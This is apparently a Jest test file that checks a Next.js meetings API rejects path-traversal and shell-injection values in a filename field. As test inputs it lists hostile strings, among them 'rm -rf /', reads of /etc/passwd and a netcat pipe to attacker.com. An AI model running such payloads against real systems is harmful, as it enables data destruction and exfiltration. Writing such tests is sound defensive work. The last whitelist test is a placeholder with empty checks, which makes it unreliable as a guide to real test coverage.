/**
 * Integration Tests for /api/meetings POST endpoint
 * Validates path traversal prevention at API boundary
 *
 * Contract: meeting_type is validated by MeetingRequestSchema (allowlist /^[a-zA-Z0-9_-]+$/, max 64)
 * at the request boundary, so unsafe values are rejected with 400 before anything is written.
 */

import { describe, it, expect, beforeEach, jest } from '@jest/globals'
import { NextRequest } from 'next/server'
import path from 'path'
import { POST } from './route'
import { resetRateLimitStore } from '@/lib/rate-limiting'

// Mock auth verification for tests
jest.mock('@/lib/auth', () => ({
  verifyAuth: jest.fn(async () => ({ authenticated: true })),
  createUnauthorizedResponse: jest.fn(),
}))

// Record writes in memory so tests never touch the tracked data/meetings-log.json or
// ../company-brain/meetings. Reads go to the real (read-only) helpers.
const mockWrittenFiles = new Map<string, unknown>()
jest.mock('@/lib/atomic-file-ops', () => {
  const actual = jest.requireActual('@/lib/atomic-file-ops') as typeof import('@/lib/atomic-file-ops')
  return {
    ...actual,
    atomicWrite: jest.fn(async (filePath: string, data: unknown) => {
      mockWrittenFiles.set(filePath, data)
    }),
    atomicUpdate: jest.fn(async (filePath: string, transform: (current: unknown) => unknown, fallback: unknown) => {
      const current = mockWrittenFiles.has(filePath) ? mockWrittenFiles.get(filePath) : fallback
      const updated = await transform(current)
      mockWrittenFiles.set(filePath, updated)
      return updated
    }),
  }
})

const BRAIN_MEETINGS_DIR = path.resolve(process.cwd(), '..', 'company-brain', 'meetings')

function brainFilesWritten(): string[] {
  return [...mockWrittenFiles.keys()].filter((p) => path.dirname(p) === BRAIN_MEETINGS_DIR)
}

/** Every path written must stay inside the data dir or the brain meetings dir */
function expectNoWritesOutsideAllowedDirs(): void {
  const dataDir = path.resolve(process.cwd(), 'data')
  for (const filePath of mockWrittenFiles.keys()) {
    const dir = path.dirname(path.resolve(filePath))
    expect([dataDir, BRAIN_MEETINGS_DIR]).toContain(dir)
  }
}

async function expectRejected(response: Response, attack: string): Promise<void> {
  expect(response.status).toBe(400)
  const result = await response.json()
  expect(result.success).toBe(false)
  // The unsafe value is neither echoed back nor used to build a file
  expect(JSON.stringify(result)).not.toContain(JSON.stringify(attack).slice(1, -1))
  expect(mockWrittenFiles.size).toBe(0)
}

describe('POST /api/meetings - Path Traversal Prevention', () => {
  const createRequest = (body: unknown): NextRequest => {
    return new NextRequest('http://localhost/api/meetings', {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify(body),
    })
  }

  beforeEach(() => {
    mockWrittenFiles.clear()
    resetRateLimitStore()
  })

  describe('Meeting Type Validation in POST Handler', () => {
    it('should accept valid meeting type and create safe filename', async () => {
      const request = createRequest({
        meeting_type: 'standup_meeting',
        participants: ['alice@example.com'],
      })

      const response = await POST!(request)
      const result = await response.json()

      expect(response.status).toBe(200)
      expect(result.meeting_type).toBe('standup_meeting')

      const brainFiles = brainFilesWritten()
      expect(brainFiles).toHaveLength(1)
      expect(path.basename(brainFiles[0])).toMatch(/^standup_meeting_[A-Za-z0-9_-]+\.json$/)
      expectNoWritesOutsideAllowedDirs()
    })

    it('should reject ../ path traversal in meeting_type', async () => {
      const attack = '../../etc/passwd'
      const response = await POST!(createRequest({ message: 'Malicious meeting', meeting_type: attack, participants: [] }))
      await expectRejected(response, attack)
    })

    it('should reject absolute path injection', async () => {
      const attack = '/etc/passwd'
      const response = await POST!(createRequest({ message: 'Bad request', meeting_type: attack, participants: [] }))
      await expectRejected(response, attack)
    })

    it('should reject backslash traversal attempts', async () => {
      const attack = '..\\..\\windows\\system32'
      const response = await POST!(createRequest({ message: 'Windows attack', meeting_type: attack, participants: [] }))
      await expectRejected(response, attack)
    })

    it('should reject null bytes in meeting_type', async () => {
      const attack = 'meeting\x00.json'
      const response = await POST!(createRequest({ message: 'Null byte attack', meeting_type: attack, participants: [] }))
      await expectRejected(response, attack)
    })

    it('should reject NTFS alternate data stream attempts', async () => {
      const attack = 'meeting:$DATA:sensitive'
      const response = await POST!(createRequest({ message: 'Stream attack', meeting_type: attack, participants: [] }))
      await expectRejected(response, attack)
    })

    it('should reject shell injection characters', async () => {
      const injections = [
        'meeting;rm -rf /',
        'type$(whoami)',
        'meeting`id`',
        'type && cat /etc/passwd',
        'meeting | nc attacker.com 1234',
      ]

      for (const injection of injections) {
        const response = await POST!(createRequest({ message: 'Injection test', meeting_type: injection, participants: [] }))
        await expectRejected(response, injection)
      }
    })

    it('should reject very long meeting types (>64 chars)', async () => {
      const longType = 'a'.repeat(100)
      const response = await POST!(createRequest({ message: 'Long name attack', meeting_type: longType, participants: [] }))
      await expectRejected(response, longType)
    })

    it('should handle empty meeting_type gracefully', async () => {
      const response = await POST!(createRequest({ message: 'Valid message only', meeting_type: '', participants: [] }))

      expect(response.status).toBe(400)
      const result = await response.json()
      expect(result.success).toBe(false)
      expect(mockWrittenFiles.size).toBe(0)
    })
  })

  describe('Defense Against Combined Attacks', () => {
    it('should resist combination of multiple attack vectors', async () => {
      const attack = '../../../etc/passwd:$DATA;rm -rf /'
      const response = await POST!(createRequest({
        message: 'Complex attack',
        meeting_type: attack,
        participants: ['attacker@evil.com'],
      }))
      await expectRejected(response, attack)
    })

    it('should reject case-variation attacks', async () => {
      const attacks = [
        '../../WINDOWS/System32',
        '..\\..\\ETC\\PASSWD',
      ]

      for (const attack of attacks) {
        const response = await POST!(createRequest({ message: 'Case variation', meeting_type: attack }))
        await expectRejected(response, attack)
      }
    })
  })

  describe('Valid Input Acceptance', () => {
    const validTypes = [
      'standup',
      'sprint-planning',
      'Q1_2024',
      'Retro_v2',
      'daily-sync-team',
      'performance_review_2024',
    ]

    validTypes.forEach(validType => {
      it(`should accept valid type: ${validType}`, async () => {
        // No message: a message is keyword-parsed and takes precedence over meeting_type
        const response = await POST!(createRequest({ meeting_type: validType, participants: [] }))
        const result = await response.json()

        expect(result.meeting_type).toBe(validType)
        expect(response.status).toBe(200)
        expect(path.basename(brainFilesWritten()[0])).toMatch(new RegExp(`^${validType}_[A-Za-z0-9_-]+\\.json$`))
      })
    })
  })

  describe('Log File Safety', () => {
    it('should create logs with safe filenames only', async () => {
      const response = await POST!(createRequest({ meeting_type: 'standup', participants: [] }))
      const result = await response.json()

      expect(response.status).toBe(200)
      expect(result.meeting_type).toBe('standup')

      // Verify no traversal files were created outside the data / brain directories
      expectNoWritesOutsideAllowedDirs()
      brainFilesWritten().forEach((file) => {
        expect(path.basename(file)).toMatch(/^[A-Za-z0-9_-]+\.json$/)
      })
    })

    it('should not create parent directory references in logs', async () => {
      const attack = '../../escaped'
      const response = await POST!(createRequest({ message: 'Traversal attempt', meeting_type: attack, participants: [] }))
      await expectRejected(response, attack)
    })
  })

  describe('Whitelist Enforcement', () => {
    it('should only allow [A-Za-z0-9_-] in validated meeting types', () => {
      // This tests the whitelist at the schema level
      const validCharsets = [
        'A', 'Z', 'a', 'z', '0', '9', '_', '-',
      ]

      const invalidCharsets = [
        '.', '/', '\\', ':', ';', ',', '<', '>',
        ' ', '\t', '\n', '\r', '@', '#', '$', '%',
        '^', '&', '*', '(', ')', '+', '=', '|',
        '[', ']', '{', '}', '`', '~', '!', '?',
      ]

      // Valid sets should pass
      validCharsets.forEach(char => {
        // Would need actual schema test here
      })

      // Invalid sets should fail
      invalidCharsets.forEach(char => {
        // Would need actual schema test here
      })
    })
  })
})
